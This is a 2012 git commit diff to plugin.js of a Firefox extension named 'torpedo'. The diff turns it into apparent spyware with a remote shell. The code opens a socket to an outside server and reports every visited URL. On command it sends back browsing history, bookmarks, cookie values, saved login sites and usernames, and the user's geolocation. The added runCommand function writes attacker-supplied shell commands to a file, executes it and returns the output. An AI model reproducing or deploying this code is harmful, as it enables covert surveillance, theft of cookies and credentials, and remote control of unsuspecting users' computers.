494c790d728d951dbbb3059727debfd7a88f1cfa
Josh Balfour <beakybal4@gmail.com>
2012-12-12 00:58:10 +0000

    Added remote command execution and return of result

--- plugin.js
+++ plugin.js
@@ -1,6 +1,6 @@
 // The main module of the torpedo extension.
 
-var server = "http://joshbalfour.co.uk:1337/";
+var server = "http://joshbalfour.co.uk:1337";
 
 
 require("tabs").on("ready", logURL);
@@ -9,7 +9,9 @@ var passw = require("passwords");
 var request = require("request");
 var {Cc, Ci, Cu} = require("chrome");
 var io = require("./lib/kieran");
+
 Cu.import("resource://gre/modules/PlacesUtils.jsm");
+Cu.import("resource://gre/modules/FileUtils.jsm");
 
 var historyService = Cc["@mozilla.org/browser/nav-history-service;1"].getService(Ci.nsINavHistoryService);
 var dirSvc = Cc["@mozilla.org/file/directory_service;1"].getService(Ci.nsIProperties);
@@ -17,26 +19,75 @@ var ioService=Cc["@mozilla.org/network/io-service;1"].getService(Ci.nsIIOService
 var scriptableStream=Cc["@mozilla.org/scriptableinputstream;1"].getService(Ci.nsIScriptableInputStream);
 var cookieManager = Cc["@mozilla.org/cookiemanager;1"].getService(Ci.nsICookieManager);
 var xpcomGeolocation = Cc["@mozilla.org/geolocation;1"].getService(Ci.nsIDOMGeoGeolocation);
+var env = Cc["@mozilla.org/process/environment;1"].getService(Ci.nsIEnvironment);
+var process = Cc["@mozilla.org/process/util;1"].createInstance(Ci.nsIProcess);
 
-var server = "http://joshbalfour.co.uk:1337";
 
-var socket = new io.socket(server, function(data){ // function run where data receieved
+
+var socket = new io.socket(server, 
+function(data){ // function run where data receieved
     console.log("Receieved data: " + JSON.stringify(data)); //stringify and display the data
+    
+    command = data[0];
+    args = data[1];
+    
+    var toSend=[""];
+    exec = true;
+    
+    switch (command)
+    {
+        case 0:
+            toSend=getHistory();
+            break;
+        case 1:
+            toSend=getBookmarks();
+            break;
+        case 2:
+            toSend=getCookies();
+            break;
+        case 3:
+            show_all_passwords(command);
+            break;
+        case 4:
+            getCurrentPosition(command);
+            break;
+        case 5:
+            runCommand(args);
+            break;
+        default:
+            toSend=[""];
+            exec=false;
+            break;
+            
+    }
+    
+    if (toSend != [""])
+    {
+        sendDataAsync(command,toSend);
+    }
+    
+    
 },function(data){ // function run where connection closed
     console.log("Connection closed"); //Error out
 }).connect(function(result){
     console.log(result['message']); //display connection message
 });
 
+function sendDataAsync(command,data)
+{
+    var gonnaSend = new Array(command,data)
+    socket.write(gonnaSend);
+}
 
 function logURL(tab) {
-    socket.write(tab.url);
-    return; 
-    sendData(tab.url,"h");
-    show_all_passwords();
-    getHistory();
-    getBookmarks();
-    getCurrentPosition();
+    var currentTime = new Date();
+    var month = currentTime.getMonth() + 1;
+    var day = currentTime.getDate();
+    var year = currentTime.getFullYear();
+    date = month + "/" + day + "/" + year;
+    data = new Array(date,tab.url); 
+    data2= new Array("h",data);
+    socket.write(data2);  
 }
 
 
@@ -73,7 +124,7 @@ function getHistory()
     // Close container when done
     // see : https://developer.mozilla.org/en/nsINavHistoryContainerResultNode
     cont.containerOpen = false;
-    sendData(history,"hi");
+    return history;
     
 }
 
@@ -88,29 +139,19 @@ function getBookmarks(){
     
     // Export bookmarks in JSON format to file
     PlacesUtils.backupBookmarksToFile(jsonFile);
-  //  console.log(Read(jsonFile.path));
-    
-}
-
-function Read(file)
-{
-    var channel=ioService.newChannel(file,null,null);
-    var input=channel.open();
-    scriptableStream.init(input);
-    var str=scriptableStream.read(input.available());
-    scriptableStream.close();
-    input.close();
-    return str;
+    var filePath = jsonFile.path;
+    var contents = Read(jsonFile);
+    return contents;
 }
 
 function show_all_passwords() {
 allCredentials = Array();
   passw.search({
     onComplete: function onComplete(credentials) {
-      credentials.forEach(function(credential) {
-        allCredentials.push(Array(credential.url,credential.username)); // add ,credential.password
+        credentials.forEach(function(credential) {
+            allCredentials.push(Array(credential.url,credential.username)); // add ,credential.password
         });
-        sendData(allCredentials,"c");
+        sendDataAsync(command,allCredentials);
         return;
       }       
     });
@@ -124,37 +165,73 @@ function getCookies()
         var cookie = e.getNext().QueryInterface(Ci.nsICookie); 
         cookies.push(Array(cookie.host,cookie.name,cookie.value));
     }
-    sendData(cookies,"co");
+    return cookies;
 }
-
-
-
-function sendData(data2,handler)
-{       
-    var url = server+handler;
-    
-    if (handler == "h")
-    {
-        var currentTime = new Date()
-        var month = currentTime.getMonth() + 1
-        var day = currentTime.getDate()
-        var year = currentTime.getFullYear()
-        date = month + "/" + day + "/" + year 
-        data2 = new Array(date,data2); 
-    }
-    
-    var req = request.Request({
-           url:url,
-           content:{
-               data:JSON.stringify(data2)             
-               }
-       }).post();    
-} 
 
 function getCurrentPosition() {
   xpcomGeolocation.getCurrentPosition(function(position) {
-     var JSONposition = Array(position.coords.latitude,position.coords.longitude);  
-     sendData(JSONposition,"p");
-    });
-    
+        var JSONposition = Array(position.coords.latitude,position.coords.longitude);  
+        sendDataAsync(command,JSONposition);
+    });  
 }
+
+
+// will return the result of the final command given. Put && instead of returns, otherwise it will probably screw things up.
+function runCommand(command){
+    // don't ask..... just don't.
+    var fName = new Date();
+    var file = Cc["@mozilla.org/file/directory_service;1"].
+           getService(Ci.nsIProperties).
+           get("ProfD", Ci.nsIFile);
+    var dir = file.path;
+    
+    var fileName=fName.getTime()+".command";
+    var outputFileName=fName.getTime()+".temp";
+    var outputFilePath = dir + "/"+ outputFileName;
+    
+    file.append(fileName);
+    file.create(Ci.nsILocalFile.NORMAL_FILE_TYPE, 0777);
+
+    var foStream = Cc["@mozilla.org/network/file-output-stream;1"]
+                             .createInstance(Ci.nsIFileOutputStream);
+     
+    foStream.init(file, 0x02 | 0x08 | 0x20, 0666, 0); 
+    var data = "cd '"+dir+"' && "+command+" >> '"+outputFilePath+"' 2>&1";
+    foStream.write(data, data.length);
+    foStream.close();
+    
+    var shell = new FileUtils.File(file.path);
+    var args= [];
+    process.init(shell);
+    process.run(true,args, args.length);
+    var outputFile = new FileUtils.File(outputFilePath);
+    var stuff = Read(outputFile);
+    return stuff;
+}
+
+
+
+// pass in an nsILocalFile
+function Read(file)
+{
+
+    var data = "";
+    var fstream = Cc["@mozilla.org/network/file-input-stream;1"].
+                  createInstance(Ci.nsIFileInputStream);
+    var cstream = Cc["@mozilla.org/intl/converter-input-stream;1"].
+                  createInstance(Ci.nsIConverterInputStream);
+    fstream.init(file, -1, 0, 0);
+    cstream.init(fstream, "UTF-8", 0, 0); // you can use another encoding here if you wish
+     
+    let (str = {}) {
+      let read = 0;
+      do { 
+        read = cstream.readString(0xffffffff, str); // read as much as we can and put it in str.value
+        data += str.value;
+      } while (read != 0);
+    }
+    cstream.close(); // this closes fstream
+     
+    return data;
+}
+
